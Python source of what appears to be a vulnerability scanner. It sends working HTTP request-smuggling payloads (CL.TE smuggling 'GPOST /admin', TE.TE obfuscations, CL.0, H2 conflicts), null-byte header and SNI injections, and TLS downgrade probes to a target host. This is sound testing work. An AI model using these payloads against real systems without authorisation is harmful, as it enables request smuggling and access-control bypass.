def _stage05_smuggle_clte(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "CL.TE desync probe")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    body = (b"POST / HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n" +
            b"5c\r\nGPOST /admin HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n")
    r = _smuggle_send(target.host, target.port, body, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
    setk("stage05.smuggle.clte.response_count", r["response_count"])
    setk("stage05.smuggle.clte.bytes", r["bytes"])
    setk("stage05.smuggle.clte.second_response_seen", r["second_response_seen"])
    setk("stage05.smuggle.clte.raw_preview", safe_ascii(r["raw_response"], 300))
    emit_kv(emit, "response_bytes", str(r["bytes"]), BRAND)
    emit_kv(emit, "response_count", str(r["response_count"]))
    if r["second_response_seen"] or b"GPOST" in r["raw_response"]:
        emit_alert(emit, "vuln", "CL.TE desync signature detected")
        count("vulns")
        setk("vulnerability.smuggle_clte.detected", True)
    else:
        emit_alert(emit, "ok", "no CL.TE desync signature")


def _stage05_smuggle_tecl(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TE.CL desync probe")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    body = (b"POST / HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n" +
            b"0\r\n\r\nX")
    r = _smuggle_send(target.host, target.port, body, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
    setk("stage05.smuggle.tecl.response_count", r["response_count"])
    setk("stage05.smuggle.tecl.bytes", r["bytes"])
    emit_kv(emit, "response_bytes", str(r["bytes"]), BRAND)
    emit_kv(emit, "response_count", str(r["response_count"]))
    if r["response_count"] >= 2:
        emit_alert(emit, "warn", "TE.CL response anomaly")
        setk("vulnerability.smuggle_tecl.surface", True)
    else:
        emit_alert(emit, "ok", "no TE.CL desync signature")


def _stage05_smuggle_tete(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TE.TE obfuscation (4 variants)")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    variants = [
        (b"Transfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n", "double-te"),
        (b"Transfer-Encoding: chunked\r\nTransfer-Encoding : chunked\r\n", "ws-colon"),
        (b"Transfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n", "reversed"),
        (b"Transfer-encoding: chunked\r\n", "case-mismatch"),
    ]
    hits = []
    for te_header, label in variants:
        body = (b"POST / HTTP/1.1\r\nHost: " + host_header.encode() + b"\r\n" +
                te_header + b"Content-Length: 6\r\n\r\n0\r\n\r\nX")
        r = _smuggle_send(target.host, target.port, body, timeout=3.0,
                           use_tls=use_tls, sni=target.host)
        if r["response_count"] >= 2:
            hits.append(label)
            emit_kv(emit, label, "double response", DANGER)
        else:
            emit_kv(emit, label, "single response", OK)
    setk("stage05.smuggle.tete.hits", hits)
    if hits:
        emit_alert(emit, "vuln", "TE.TE desync: " + ", ".join(hits))
        count("vulns")
        setk("vulnerability.smuggle_tete.detected", True)
    else:
        emit_alert(emit, "ok", "no TE.TE desync signature")


def _stage05_smuggle_cl0(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "CL.0 desync probe")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    body = (b"POST / HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nContent-Length: 0\r\n\r\n" +
            b"GET /admin HTTP/1.1\r\nHost: " + host_header.encode() + b"\r\n\r\n")
    r = _smuggle_send(target.host, target.port, body, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
    setk("stage05.smuggle.cl0.response_count", r["response_count"])
    setk("stage05.smuggle.cl0.bytes", r["bytes"])
    emit_kv(emit, "response_bytes", str(r["bytes"]), BRAND)
    emit_kv(emit, "response_count", str(r["response_count"]))
    if r["response_count"] >= 2:
        emit_alert(emit, "vuln", "CL.0 desync — second response received")
        count("vulns")
        setk("vulnerability.smuggle_cl0.detected", True)
    else:
        emit_alert(emit, "ok", "no CL.0 desync signature")


def _stage05_smuggle_h2cl(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "H2.CL conflict probe")
    s, info = _h2_open(host=target.host, port=target.port, timeout=5.0, sni=target.host)
    if s is None:
        emit_alert(emit, "warn", "h2 open failed")
        return
    try:
        _h2_handshake(s, timeout=3.0)
        block = _h2_pseudo_headers("POST", "/", "https", _current_host_header())
        block += _h2_hpack_encode(b"content-length", b"5")
        try:
            s.sendall(_h2_frame(H2_HEADERS, H2_FLAG_END_HEADERS, 1, block))
            s.sendall(_h2_frame(H2_DATA, H2_FLAG_END_STREAM, 1, b"hello"))
        except Exception:
            pass
        time.sleep(0.3)
        data = b""
        try:
            s.settimeout(2.0)
            data = s.recv(16384)
        except Exception:
            pass
        frames = _h2_parse_frames(data)
        goaway = [f for f in frames if f["type"] == H2_GOAWAY]
        rst = [f for f in frames if f["type"] == H2_RST_STREAM]
        setk("stage05.smuggle.h2cl.goaway", len(goaway))
        setk("stage05.smuggle.h2cl.rst", len(rst))
        emit_kv(emit, "server_goaway", str(len(goaway)))
        emit_kv(emit, "server_rst_stream", str(len(rst)))
        if goaway or rst:
            emit_alert(emit, "ok",
                       "server rejected H2 + content-length conflict")
        else:
            emit_alert(emit, "warn", "H2.CL conflict not rejected")
            setk("vulnerability.smuggle_h2cl.surface", True)
    finally:
        try:
            s.close()
        except Exception:
            pass


def _stage05_smuggle_h2te(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "H2.TE conflict probe")
    s, info = _h2_open(host=target.host, port=target.port, timeout=5.0, sni=target.host)
    if s is None:
        emit_alert(emit, "warn", "h2 open failed")
        return
    try:
        _h2_handshake(s, timeout=3.0)
        block = _h2_pseudo_headers("POST", "/", "https", _current_host_header())
        block += _h2_hpack_encode(b"transfer-encoding", b"chunked")
        try:
            s.sendall(_h2_frame(H2_HEADERS, H2_FLAG_END_HEADERS, 1, block))
            s.sendall(_h2_frame(H2_DATA, H2_FLAG_END_STREAM, 1, b"0\r\n\r\n"))
        except Exception:
            pass
        time.sleep(0.3)
        data = b""
        try:
            s.settimeout(2.0)
            data = s.recv(16384)
        except Exception:
            pass
        frames = _h2_parse_frames(data)
        goaway = [f for f in frames if f["type"] == H2_GOAWAY]
        rst = [f for f in frames if f["type"] == H2_RST_STREAM]
        setk("stage05.smuggle.h2te.goaway", len(goaway))
        setk("stage05.smuggle.h2te.rst", len(rst))
        emit_kv(emit, "server_goaway", str(len(goaway)))
        emit_kv(emit, "server_rst_stream", str(len(rst)))
        if goaway or rst:
            emit_alert(emit, "ok", "server rejected H2 + transfer-encoding")
        else:
            emit_alert(emit, "warn", "H2.TE conflict not rejected")
            setk("vulnerability.smuggle_h2te.surface", True)
    finally:
        try:
            s.close()
        except Exception:
            pass


def _stage05_keepalive(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "pipelined GETs on one connection")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    body = (b"GET / HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nConnection: keep-alive\r\n\r\n" +
            b"GET /robots.txt HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nConnection: close\r\n\r\n")
    r = _smuggle_send(target.host, target.port, body, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
    setk("stage05.keepalive.response_count", r["response_count"])
    emit_kv(emit, "response_bytes", str(r["bytes"]), BRAND)
    emit_kv(emit, "response_count", str(r["response_count"]),
             OK if r["response_count"] >= 2 else MUTED)
    if r["response_count"] >= 2:
        emit_alert(emit, "ok", "server pipelines responses")
    else:
        emit_alert(emit, "info", "server closed after first response")


def _stage05_expect100(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "Expect: 100-continue handling")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    body = (b"POST / HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nContent-Length: 5\r\nExpect: 100-continue\r\n\r\nhello")
    r = _smuggle_send(target.host, target.port, body, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
    saw100 = b"100 Continue" in r["raw_response"]
    setk("stage05.expect100.saw_100", saw100)
    setk("stage05.expect100.bytes", r["bytes"])
    emit_kv(emit, "response_bytes", str(r["bytes"]), BRAND)
    emit_kv(emit, "saw_100_continue", str(saw100), OK if saw100 else MUTED)
    if not saw100 and r["bytes"] > 0:
        emit_alert(emit, "info", "server ignored Expect: 100-continue")


def _stage05_trailer(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "chunked trailer acceptance")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    body = (b"POST / HTTP/1.1\r\nHost: " + host_header.encode() +
            b"\r\nTransfer-Encoding: chunked\r\nTrailer: X-Checksum\r\n\r\n" +
            b"5\r\nhello\r\n0\r\nX-Checksum: deadbeef\r\n\r\n")
    r = _smuggle_send(target.host, target.port, body, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
    setk("stage05.trailer.bytes", r["bytes"])
    setk("stage05.trailer.first_line", r["first_line"])
    emit_kv(emit, "response_bytes", str(r["bytes"]), BRAND)
    emit_kv(emit, "first_line", r["first_line"][:80] if r["first_line"] else "-", VALUE)
    if r["bytes"] > 0:
        try:
            status = int(r["first_line"].split(" ")[1])
        except Exception:
            status = None
        if status and status < 500:
            emit_alert(emit, "ok", "server accepted chunked trailer")
        else:
            emit_alert(emit, "info", "server returned %s" % status)


def _stage05_header_oddities(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "header oddities: case, dup, ws, null, obs-fold")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    variants = [
        ("case", b"GET / HTTP/1.1\r\nHOST: " + host_header.encode() + b"\r\n\r\n"),
        ("dup_host", b"GET / HTTP/1.1\r\nHost: " + host_header.encode() +
         b"\r\nHost: localhost\r\n\r\n"),
        ("ws_before_colon", b"GET / HTTP/1.1\r\nHost : " + host_header.encode() +
         b"\r\n\r\n"),
        ("null_byte", b"GET / HTTP/1.1\r\nHost: " + host_header.encode() +
         b"\x00evil.com\r\n\r\n"),
        ("obs_fold", b"GET / HTTP/1.1\r\nHost: " + host_header.encode() +
         b"\r\nX-Foo: bar\r\n baz\r\n\r\n"),
    ]
    results = {}
    accepted = 0
    for label, payload in variants:
        r = _smuggle_send(target.host, target.port, payload, timeout=3.0,
                           use_tls=use_tls, sni=target.host)
        try:
            status = int(r["first_line"].split(" ")[1])
        except Exception:
            status = None
        results[label] = {"status": status, "bytes": r["bytes"]}
        setk("stage05.header_oddities.%s" % label, results[label])
        col = OK if status and status < 400 else WARN if status and status < 500 else MUTED
        if status and status < 400:
            accepted += 1
        emit_kv(emit, label, "status=%s bytes=%d" % (status, r["bytes"]), col)
    setk("stage05.header_oddities.accepted_count", accepted)
    emit_kv(emit, "accepted_variants", "%d/%d" % (accepted, len(variants)),
             WARN if accepted >= 2 else OK)


register_stage(StageSpec(5, "stage_05_http_layer", "HTTP Layer Attacks",
    "Probes HTTP/1.0, HTTP/0.9, and HTTP/2. Tests h2 ALPN, SETTINGS, pseudo-headers, "
    "Rapid Reset, CONTINUATION flood. Runs real request smuggling: CL.TE, TE.CL, TE.TE, "
    "CL.0, H2.CL, H2.TE. Checks pipelining, Expect 100, chunked trailers, header oddities.",
    [
        TestSpec("http10.probe", "HTTP/1.0 acceptance", _stage05_http10, 12.0),
        TestSpec("http09.probe", "HTTP/0.9 bare GET", _stage05_http09, 10.0),
        TestSpec("h2.alpn", "HTTP/2 ALPN", _stage05_h2_alpn, 10.0),
        TestSpec("h2.settings", "h2 SETTINGS exchange", _stage05_h2_settings, 15.0),
        TestSpec("h2.pseudo_headers", "h2 pseudo-header request",
                 _stage05_h2_pseudo, 15.0),
        TestSpec("h2.rapid_reset", "Rapid Reset CVE-2023-44487",
                 _stage05_h2_rapid_reset, 20.0),
        TestSpec("h2.continuation", "CONTINUATION flood CVE-2024-27316",
                 _stage05_h2_continuation, 20.0),
        TestSpec("smuggle.cl_te", "CL.TE smuggling", _stage05_smuggle_clte, 15.0),
        TestSpec("smuggle.te_cl", "TE.CL smuggling", _stage05_smuggle_tecl, 15.0),
        TestSpec("smuggle.te_te", "TE.TE obfuscation", _stage05_smuggle_tete, 25.0),
        TestSpec("smuggle.cl0", "CL.0 smuggling", _stage05_smuggle_cl0, 15.0),
        TestSpec("smuggle.h2cl", "H2.CL conflict", _stage05_smuggle_h2cl, 15.0),
        TestSpec("smuggle.h2te", "H2.TE conflict", _stage05_smuggle_h2te, 15.0),
        TestSpec("keepalive.pipeline", "request pipelining",
                 _stage05_keepalive, 12.0),
        TestSpec("expect100", "Expect: 100-continue", _stage05_expect100, 12.0),
        TestSpec("trailer", "chunked trailer", _stage05_trailer, 12.0),
        TestSpec("header.oddities", "header oddities",
                 _stage05_header_oddities, 30.0),
    ], 300.0))


def _stage06_sni_variant(host, port, sni_bytes, extra_exts=None, timeout=4.0):
    exts = list(extra_exts or [])
    if sni_bytes is not None:
        try:
            ns = (sni_bytes.decode("idna")
                  if any(ord(c) > 127 for c in sni_bytes.decode("utf-8", "replace"))
                  else sni_bytes.decode("ascii", "ignore"))
        except Exception:
            ns = sni_bytes.decode("ascii", "ignore")
    else:
        ns = None
    payload = build_client_hello(version=0x0303, cipher_ids=DEFAULT_TLS12_CIPHERS,
                                  sni=ns, groups=DEFAULT_GROUPS,
                                  sig_algs=DEFAULT_SIG_ALGS,
                                  extra_extensions=exts)
    s = None
    out = {"cert_cn": "", "server_hello": False, "alerts": [], "bytes": 0, "error": ""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        s.sendall(payload)
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                s.settimeout(max(0.05, end - time.time()))
                chunk = s.recv(8192)
                if not chunk:
                    break
                data += chunk
                recs = []
                off = 0
                while True:
                    rec, off2 = TLSRecord.decode(data, off)
                    if rec is None:
                        break
                    recs.append(rec)
                    off = off2
                if any(r.content_type == CT_ALERT for r in recs):
                    break
                cm = extract_certificate(recs)
                if cm and cm.certs:
                    parsed = parse_der_certificate(cm.certs[0])
                    if parsed:
                        out["cert_cn"] = parsed.subject_cn()
                    break
                sh = extract_server_hello(recs)
                if sh:
                    out["server_hello"] = True
                    if not (cm and cm.certs):
                        continue
            except socket.timeout:
                break
            except Exception:
                break
        out["bytes"] = len(data)
        recs = []
        off = 0
        while True:
            rec, off2 = TLSRecord.decode(data, off)
            if rec is None:
                break
            recs.append(rec)
            off = off2
        out["alerts"] = extract_alerts(recs)
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


def _stage06_sni_case(emit, setk, kb):
    target = _current_target()
    upper = target.host.upper().encode("ascii")
    emit_header(emit, "uppercase SNI: %s" % target.host.upper())
    r = _stage06_sni_variant(target.host, target.port, upper, timeout=4.0)
    setk("stage06.sni_case.cert_cn", r["cert_cn"])
    emit_kv(emit, "sni_sent", target.host.upper(), VALUE)
    emit_kv(emit, "cert_cn", r["cert_cn"] or "(no cert)",
             VALUE if r["cert_cn"] else MUTED)
    if r["cert_cn"] and r["cert_cn"].lower() == target.host.lower():
        emit_alert(emit, "warn", "server accepts case-insensitive SNI")
        setk("vulnerability.sni_case.accepted", True)


def _stage06_sni_trailing_dot(emit, setk, kb):
    target = _current_target()
    variant = (target.host + ".").encode("ascii")
    emit_header(emit, "trailing-dot SNI: %s." % target.host)
    r = _stage06_sni_variant(target.host, target.port, variant, timeout=4.0)
    setk("stage06.sni_trailing_dot.cert_cn", r["cert_cn"])
    emit_kv(emit, "sni_sent", target.host + ".", VALUE)
    emit_kv(emit, "cert_cn", r["cert_cn"] or "(no cert)",
             VALUE if r["cert_cn"] else MUTED)
    if r["cert_cn"] and r["cert_cn"].lower().rstrip(".") == target.host.lower():
        emit_alert(emit, "warn", "server accepts trailing-dot SNI")


def _stage06_sni_null(emit, setk, kb):
    target = _current_target()
    variant = (target.host + "\x00.attacker.invalid").encode("ascii")
    emit_header(emit, "null-byte SNI")
    r = _stage06_sni_variant(target.host, target.port, variant, timeout=4.0)
    setk("stage06.sni_null.cert_cn", r["cert_cn"])
    emit_kv(emit, "sni_bytes_len", str(len(variant)), VALUE)
    emit_kv(emit, "cert_cn", r["cert_cn"] or "(no cert)",
             VALUE if r["cert_cn"] else MUTED)
    for a in r["alerts"][:2]:
        emit_kv(emit, "alert", a[2], WARN)
    if r["cert_cn"] and target.host.lower() in r["cert_cn"].lower():
        emit_alert(emit, "vuln",
                   "null-byte SNI accepted — truncation vulnerability")
        count("vulns")
        setk("vulnerability.sni_null.detected", True)


def _stage06_sni_leading_dot(emit, setk, kb):
    target = _current_target()
    variant = ("." + target.host).encode("ascii")
    emit_header(emit, "leading-dot SNI")
    r = _stage06_sni_variant(target.host, target.port, variant, timeout=4.0)
    setk("stage06.sni_leading_dot.cert_cn", r["cert_cn"])
    emit_kv(emit, "cert_cn", r["cert_cn"] or "(no cert)",
             VALUE if r["cert_cn"] else MUTED)
    if r["cert_cn"]:
        emit_alert(emit, "warn", "server accepted leading-dot SNI")


def _stage06_sni_omit(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "no SNI — default vhost")
    r = _stage06_sni_variant(target.host, target.port, None, timeout=4.0)
    setk("stage06.sni_omit.cert_cn", r["cert_cn"])
    setk("stage06.sni_omit.sh_present", r["server_hello"])
    emit_kv(emit, "server_hello", str(r["server_hello"]),
             WARN if r["server_hello"] else OK)
    emit_kv(emit, "cert_cn", r["cert_cn"] or "(no cert)",
             VALUE if r["cert_cn"] else MUTED)
    if r["server_hello"]:
        emit_alert(emit, "info", "no-SNI handshake accepted (default vhost)")
    else:
        emit_alert(emit, "ok", "server rejected no-SNI handshake")


def _stage06_grease(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "RFC 8701 GREASE extension + cipher")
    eid = 0x0a0a
    cid = 0x0a0a
    exts = [(eid, b"")]
    ciphers = [cid] + list(DEFAULT_TLS12_CIPHERS)
    payload = build_client_hello(version=0x0303, cipher_ids=ciphers,
                                  sni=target.host, groups=DEFAULT_GROUPS,
                                  sig_algs=DEFAULT_SIG_ALGS,
                                  extra_extensions=exts)
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        s.connect((target.host, target.port))
        count("connections")
        s.sendall(payload)
        recs, _ = read_tls_records(s, timeout=4.0)
        sh = extract_server_hello(recs)
        setk("stage06.grease.ext_used", "0x%04x" % eid)
        setk("stage06.grease.cipher_used", "0x%04x" % cid)
        setk("stage06.grease.sh_present", sh is not None)
        emit_kv(emit, "grease_ext", "0x%04x" % eid, VALUE)
        emit_kv(emit, "grease_cipher", "0x%04x" % cid, VALUE)
        emit_kv(emit, "server_hello", str(sh is not None), OK if sh else WARN)
        if sh:
            emit_alert(emit, "ok", "server ignored GREASE (RFC 8701 compliant)")
    except Exception as e:
        emit_alert(emit, "warn", "GREASE probe error: " + str(e))
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage06_version_downgrade(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "legacy version acceptance (SSLv3 → TLS 1.2)")
    results = {}
    for label, ver in [("ssl3", 0x0300), ("tls10", 0x0301),
                        ("tls11", 0x0302), ("tls12", 0x0303)]:
        r = tls_probe(target.host, target.port, ver, DEFAULT_TLS12_CIPHERS,
                       timeout=4.0, sni=target.host)
        accepted = r.get("server_hello") is not None
        results[label] = accepted
        setk("stage06.version_downgrade.%s" % label, accepted)
        col = OK if accepted else MUTED
        if label in ("ssl3", "tls10") and accepted:
            col = DANGER
        emit_kv(emit, label, "accepted" if accepted else "rejected", col)
    if results.get("ssl3"):
        emit_alert(emit, "vuln", "SSLv3 accepted")
        count("vulns")
        setk("vulnerability.version_downgrade.ssl3", True)
    elif results.get("tls10"):
        emit_alert(emit, "warn", "TLS 1.0 accepted")
        setk("vulnerability.version_downgrade.tls10", True)
    else:
        emit_alert(emit, "ok", "server enforces TLS 1.1+ minimum")


def _stage06_cipher_downgrade(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "weak cipher groups offered in isolation")
    weak_groups = [
        ("rc4_sha", [0x0005, 0x0004]),
        ("3des_cbc", [0x000a, 0x0016]),
        ("export", [0x0003, 0x0008, 0x0014]),
        ("null", [0x0001, 0x0002, 0x003b]),
        ("anon", [0x0018, 0x001b]),
    ]
    hits = []
    for label, ciphers in weak_groups:
        r = tls_probe(target.host, target.port, 0x0303, ciphers,
                       timeout=4.0, sni=target.host,
                       groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
        sh = r.get("server_hello")
        if sh is not None and sh.cipher_suite in ciphers:
            hits.append({"group": label, "cipher": sh.cipher_suite,
                          "name": cipher_name(sh.cipher_suite)})
            emit_kv(emit, label,
                     "accepted 0x%04x %s" % (sh.cipher_suite, cipher_name(sh.cipher_suite)),
                     DANGER)
        else:
            emit_kv(emit, label, "rejected", OK)
    setk("stage06.cipher_downgrade.hits", hits)
    if hits:
        emit_alert(emit, "vuln",
                   "weak cipher groups accepted: " + ", ".join(h["group"] for h in hits))
        count("vulns")
        setk("vulnerability.cipher_downgrade.detected", True)
    else:
        emit_alert(emit, "ok", "no weak cipher groups accepted")


def _stage06_dup_ext(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "duplicate server_name extension")
    duplicate_exts = [
        (EXT_SERVER_NAME, pack_u16(len(target.host) + 3) + b"\x00" +
         pack_u16(len(target.host)) + target.host.encode()),
        (EXT_SERVER_NAME, pack_u16(19) + b"\x00" + pack_u16(16) + b"attacker.invalid"),
    ]
    payload = build_client_hello(version=0x0303, cipher_ids=DEFAULT_TLS12_CIPHERS,
                                  sni=None, groups=DEFAULT_GROUPS,
                                  sig_algs=DEFAULT_SIG_ALGS,
                                  extra_extensions=duplicate_exts)
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        s.connect((target.host, target.port))
        count("connections")
        s.sendall(payload)
        recs, _ = read_tls_records(s, timeout=4.0)
        sh = extract_server_hello(recs)
        alerts = extract_alerts(recs)
        setk("stage06.duplicate_ext.sh_present", sh is not None)
        setk("stage06.duplicate_ext.alerts", alerts)
        emit_kv(emit, "server_hello", str(sh is not None), WARN if sh else OK)
        for a in alerts[:2]:
            emit_kv(emit, "alert", a[2], OK)
        if sh is None and alerts:
            emit_alert(emit, "ok", "server rejected duplicate extensions with alert")
        elif sh:
            emit_alert(emit, "warn", "server accepted duplicate extensions")
            setk("vulnerability.duplicate_ext.detected", True)
    except Exception as e:
        emit_alert(emit, "warn", "duplicate ext probe error: " + str(e))
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage06_bad_ext_len(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "malformed SNI extension length")
    bad_sni_body = pack_u16(5) + b"\x00" + pack_u16(100) + b"ab"
    payload = build_client_hello(version=0x0303, cipher_ids=DEFAULT_TLS12_CIPHERS,
                                  sni=None, groups=DEFAULT_GROUPS,
                                  sig_algs=DEFAULT_SIG_ALGS,
                                  extra_extensions=[(EXT_SERVER_NAME, bad_sni_body)])
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        s.connect((target.host, target.port))
        count("connections")
        s.sendall(payload)
        recs, _ = read_tls_records(s, timeout=4.0)
        sh = extract_server_hello(recs)
        alerts = extract_alerts(recs)
        setk("stage06.invalid_ext_len.sh_present", sh is not None)
        setk("stage06.invalid_ext_len.alerts", alerts)
        emit_kv(emit, "server_hello", str(sh is not None), WARN if sh else OK)
        for a in alerts[:2]:
            emit_kv(emit, "alert", a[2], OK)
        if alerts:
            emit_alert(emit, "ok", "server rejected malformed extension")
        elif sh:
            emit_alert(emit, "warn", "server accepted malformed SNI extension")
            setk("vulnerability.invalid_ext_len.detected", True)
        else:
            emit_alert(emit, "info", "server closed connection without alert")
    except Exception as e:
        emit_alert(emit, "warn", "bad ext len probe error: " + str(e))
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage06_random_past(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "ClientHello random with 2018 timestamp prefix")
    past_ts = int(datetime(2018, 1, 1, tzinfo=timezone.utc).timestamp())
    rand = struct.pack(">I", past_ts) + rand_bytes(28)
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host, extra_extensions=None)
    sh = r.get("server_hello")
    setk("stage06.random_past.sh_present", sh is not None)
    emit_kv(emit, "random_ts", "2018-01-01", VALUE)
    emit_kv(emit, "server_hello", str(sh is not None), OK if sh else WARN)
    if sh:
        emit_alert(emit, "ok", "server accepts past-timestamped ClientHello random")
    else:
        emit_alert(emit, "info", "server rejected past-timestamped random")


def _stage06_random_future(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "ClientHello random with 2099 timestamp prefix")
    future_ts = int(datetime(2099, 1, 1, tzinfo=timezone.utc).timestamp())
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host)
    sh = r.get("server_hello")
    setk("stage06.random_future.sh_present", sh is not None)
    emit_kv(emit, "random_ts", "2099-01-01", VALUE)
    emit_kv(emit, "server_hello", str(sh is not None), OK if sh else WARN)


def _stage06_rsa_only(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "RSA-KX only cipher set (no forward secrecy)")
    rsa_only = [0x002f, 0x0035, 0x003c, 0x003d, 0x009c, 0x009d]
    r = tls_probe(target.host, target.port, 0x0303, rsa_only,
                   timeout=4.0, sni=target.host,
                   groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
    sh = r.get("server_hello")
    setk("stage06.rsa_kx_only.sh_present", sh is not None)
    if sh:
        cid = sh.cipher_suite
        setk("stage06.rsa_kx_only.cipher", cid)
        emit_kv(emit, "cipher_negotiated",
                 "0x%04x %s" % (cid, cipher_name(cid)), WARN)
        if cid in rsa_only:
            emit_alert(emit, "warn",
                       "server accepted RSA-KX only — no forward secrecy")
            setk("vulnerability.rsa_kx.accepted", True)
    else:
        emit_kv(emit, "server_hello", "rejected", OK)
        emit_alert(emit, "ok", "server rejected RSA-only cipher set")


def _stage06_ech_grease(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "ECH GREASE extension (0xfe0d)")
    ech_payload = pack_u8(0) + pack_u8(0) + b""
    payload = build_client_hello(version=0x0303, cipher_ids=DEFAULT_TLS12_CIPHERS,
                                  sni=target.host, groups=DEFAULT_GROUPS,
                                  sig_algs=DEFAULT_SIG_ALGS,
                                  extra_extensions=[(EXT_ENCRYPTED_SERVER_NAME,
                                                      ech_payload)])
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        s.connect((target.host, target.port))
        count("connections")
        s.sendall(payload)
        recs, _ = read_tls_records(s, timeout=4.0)
        sh = extract_server_hello(recs)
        setk("stage06.ech_grease.sh_present", sh is not None)
        emit_kv(emit, "ech_ext_sent", "0xfe0d", VALUE)
        emit_kv(emit, "server_hello", str(sh is not None), OK if sh else MUTED)
        if sh:
            ech_resp = sh.ext_by_id(EXT_ENCRYPTED_SERVER_NAME)
            setk("stage06.ech_grease.server_ech", ech_resp is not None)
            emit_kv(emit, "server_ech_ext", str(ech_resp is not None),
                     BRAND if ech_resp else MUTED)
            emit_alert(emit, "ok", "server accepted ECH GREASE extension")
        else:
            emit_alert(emit, "info", "server did not respond to ECH GREASE")
    except Exception as e:
        emit_alert(emit, "warn", "ECH probe error: " + str(e))
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage06_ja3(emit, setk, kb):
    emit_header(emit, "JA3 fingerprint of our ClientHello")
    ciphers = DEFAULT_TLS12_CIPHERS
    ext_ids = [EXT_SERVER_NAME, EXT_SUPPORTED_GROUPS, EXT_EC_POINT_FORMATS,
               EXT_SIGNATURE_ALGORITHMS, EXT_EXTENDED_MASTER_SECRET]
    ja3_hash, ja3_str = compute_ja3(0x0303, ciphers, ext_ids, DEFAULT_GROUPS, [0])
    setk("stage06.utls.ja3_hash", ja3_hash)
    setk("stage06.utls.ja3_string", ja3_str)
    emit_kv(emit, "ja3_hash", ja3_hash, BRAND)
    emit_kv(emit, "ja3_string_len", str(len(ja3_str)))
    profiles = {
        "chrome_120": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
        "firefox_120": "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-34-51-43-13-45-28-65037,29-23-24-25-256-257,0",
    }
    matches = []
    for name, s_ in profiles.items():
        h = hashlib.md5(s_.encode()).hexdigest()
        if h == ja3_hash:
            matches.append(name)
        emit_kv(emit, name, h, OK if h == ja3_hash else MUTED)
    setk("stage06.utls.matches", matches)
    if matches:
        emit_alert(emit, "warn",
                   "our ClientHello matches: " + ", ".join(matches))
    else:
        emit_alert(emit, "info",
                   "our ClientHello doesn't match known browser profiles")


